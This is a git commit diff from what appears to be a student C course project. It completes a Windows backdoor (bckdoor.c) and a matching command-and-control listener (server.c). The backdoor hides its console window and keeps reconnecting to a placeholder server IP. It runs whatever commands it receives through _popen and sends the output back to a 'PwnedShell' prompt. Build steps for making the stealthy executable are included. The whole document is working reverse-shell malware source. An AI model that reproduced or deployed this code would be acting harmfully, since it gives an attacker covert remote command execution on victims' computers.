d18adecce6f5e7c77cdfe83b1c2ae9a4c98584ff
Felipe Pineda <fpineda@live.unc.edu>
2021-04-13 19:38:43 -0400

    completed socket programming on the files

--- C-Course/Project/bckdoor.c
+++ C-Course/Project/bckdoor.c
@@ -1,7 +1,10 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#pragma comment(lib, "Ws2_32.lib")
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
+//#include <unistd.h>
 #include <winsock2.h>
+#include <WS2tcpip.h>
 #include <windows.h>
 #include <winuser.h>
 #include <wininet.h>
@@ -11,91 +14,108 @@
 #include <sys/types.h>
 
 
+
 int sock;
 
 
 #define putZero(p, size) (void) memset((p), 0, (size))
 
 
-void Shell(){
+void Shell() {
     // returns nothing
 
     char buffer[1024];  // stores command
     char container[1024];
     char total_response[18384];
 
-    // Converstaion between server and client
-    while(1){
-        jump:
-            // zero out variables
-            putZero(buffer, sizeOf(buffer));
-            putZero(container, sizeOf(container));
-            putZero(total_response, sizeOf(total_response));
+    // Conversation between server and client
+    while (1) {
+    jump:
+        // zero out variables
+        putZero(buffer, sizeof(buffer));
+        putZero(container, sizeof(container));
+        putZero(total_response, sizeof(total_response));
 
-        // receive command from server
-        recv(sock, buffer, 1024, 0) 
+        // --receive command from server
+        recv(sock, buffer, 1024, 0);
 
-        // do action based off what command was recv'd in buffer
-        if ((strncmp("q", buffer. 1)) == 0){
-            closesocket(sock);
-            WSACleanup();
-            exit(0);
-        }
-        else{
-            FILE *fp;
-            fp = _popen(buffer, "r") // read buffer and execute (as a process) it; store it in fp
-
-            // copying (first, second, third, etc.) 1024 bytes from fp to container, then adding container into total_response. This is repeated until entire response is inside total_response
-            while (fgets(container, 1024, fp) != NULL) {
-                strcat(total_response, container)
+            // do action based off what command was recv'd in buffer
+            if ((strncmp("q", buffer, 1)) == 0) {
+                closesocket(sock);
+                WSACleanup();
+                exit(0);
             }
+            else {
+                FILE* fp;
+                fp = _popen(buffer, "r"); // read buffer and execute (as a process) it; store it in fp
 
-            // send the response to server
-            send(sock, total_response, sizeOf(total_response), 0);
-            fclose(fp);
+                // copying (first, second, third, etc.) 1024 bytes from fp to container, then adding container into total_response. This is repeated until entire response is inside total_response
+                    while (fgets(container, 1024, fp) != NULL) {
+                        strcat_s(total_response, sizeof(total_response), container);
+                    }
 
-        }
+                // --send the response to server
+                send(sock, total_response, sizeof(total_response), 0);
+                fclose(fp);
+
+            }
     }
 
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance, HISNTANCE hPev, LPSTR lpCmdLine, int nCmdShow) {
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPev, LPSTR lpCmdLine, int nCmdShow) {
 
     // Hide the console window
     HWND stealth;
     AllocConsole(); // allocate new console to calling function
-    stealth = FindWindowA("ConsoleWindowClass", NULL)  // gets handle to top level window
-    ShowWindow(stealth, 0); // hides the window
+    stealth = FindWindowA("ConsoleWindowClass", NULL);  // gets handle to top level window
+        ShowWindow(stealth, 0); // hides the window
 
 
-    // Prepping socket items
+        // Prepping socket items
     struct sockaddr_in ServerAddr;
     unsigned short ServerPort;
-    char *ServerIP;
-    WSADATA wsaData // structure that contains info about Windows Socket (Windows to Windows)
+    char* ServerIP;
+    WSADATA wsaData; // structure that contains info about Windows Socket (Windows to Windows)
     ServerIP = "<SERVER_IP>"; // REPLACE!!!
     ServerPort = 50005;
 
     // Kill program if conneciton is not possible
-    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
-        exit(1); 
+    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
+        exit(1);
     }
 
     // Cont'd prepping socket items
     sock = socket(AF_INET, SOCK_STREAM, 0); // AF_INET: establishing connection over IPv4, SOCK_STREAM: TCP/3-way handshake
-    memset(&ServerAddr, 0, sizeOf(ServerAddr)) // zero out the content serverAddr (because it's structs)
+    memset(&ServerAddr, 0, sizeof(ServerAddr)); // zero out the content serverAddr (because it's structs)
     ServerAddr.sin_family = AF_INET;
     ServerAddr.sin_addr.s_addr = inet_addr(ServerIP);
     ServerAddr.sin_port = htons(ServerPort);
 
     // rewrite start logic...
-    start:
-        // Perform connect function every 10 seconds until it is equal 0 (zero means connection was established)
-        while ( connect(sock, (struct sockaddr *) &ServAddr, sizeOf(ServerAddr)) != 0 ) {
-            Sleep(10);
-            goto start;
-        }
-    
+start:
+    // Perform connect function every 10 seconds until it is equal 0 (zero means connection was established)
+    while (connect(sock, (struct sockaddr*)&ServerAddr, sizeof(ServerAddr)) != 0) {
+        Sleep(10);
+        goto start;
+    }
+
     // recv commands from server, execute them, and then send the information back
     Shell();
 }
+
+
+
+/// Notes on how to run
+
+// 1. Create Project within Visual Studio
+// 2. Create .c file with Source Files
+// 3. Copy/Paste file into .c file
+// 4. Build -> Build <PROJECT-NAME> 
+    // not the solution, although it still might work
+// 5. Reset the Subsystem configuration to Linker->System->SubSystem should be Windows.
+    // This will allow it to create .exe file and build successfully 
+    // The alternative option for this is "Console". This allows you to run the .c file and have non-terminating console output the results of running the .c file
+    // But... it will show errors for this file
+// 6. Open command prompt and navigate to: c:\PATH\TO\source\repos\PROJECTNAME\Debug
+// 7. Run .exe file (but have server.c running first). It will run and end quick. On your linux/server you will have a pseudo terminal
--- C-Course/Project/server.c
+++ C-Course/Project/server.c
@@ -23,7 +23,7 @@ int main() {
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
     // socket error
-    if (setsockopt(sock, SOL_SOCKET, SOL_REUSEADDR, &optval, sizeOf(optval)) < 0) {
+    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0) {
         printf("Error setting tcp socket options\n");
         return 1;
 
@@ -31,23 +31,44 @@ int main() {
 
     // cont'd setting server socket items
     server_address.sin_family = AF_INET;
-    server_address.sin.s_addr = inet_addr("<SERVER_IP>"); // REPLACE!!!
-    server_address.sin_port = htons(50004);
+    server_address.sin_addr.s_addr = inet_addr("<SERVER_IP"); // REPLACE!!!
+    server_address.sin_port = htons(50005);
 
     // set up and start the connection
-    bind(sock, (struct sockaddr *) &server_address, sizeOf(server_address));
+    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
     listen(sock, 5);
-    client_length = sizeOf(client_address);
+    client_length = sizeof(client_address);
     client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
 
-
+    // Converstaion between server and client, will run until a "q" is entered
     while (1) {
         jump:
             // zero out variables
-            bzero(&buffer, sizeOf(buffer));
-            bzero(&response, sizeOf(response))
-            printf("* PwnedShell#%s~$ ", inet_ntoa(client_address.sin_addr)); // will print shell-like command line with the machine's IP in place of the %s
-            fgets(buffer, sizeOf(buffer), stdin);
+            bzero(&buffer, sizeof(buffer));
+            bzero(&response, sizeof(response));
+
+            // print shell-like command line with the machine's IP in place of the %s
+            printf("* PwnedShell#%s~$ ", inet_ntoa(client_address.sin_addr)); 
+
+            // gets command from stdin and puts into buffer
+            fgets(buffer, sizeof(buffer), stdin);
+
+            // remove trailing \n off the command (automatically does it when you write in command)
+            strtok(buffer, "\n");
+
+            // --send command to target
+            write(client_socket, buffer, sizeof(buffer));
+
+            if (strncmp("q", buffer, 1) == 0){
+                break;
+            }
+            else{
+                // --recv response from target
+                recv(client_socket, response, sizeof(response), MSG_WAITALL); // block until all is recv'd
+                printf("%s", response);
+            }
+
+
     }
 
 }
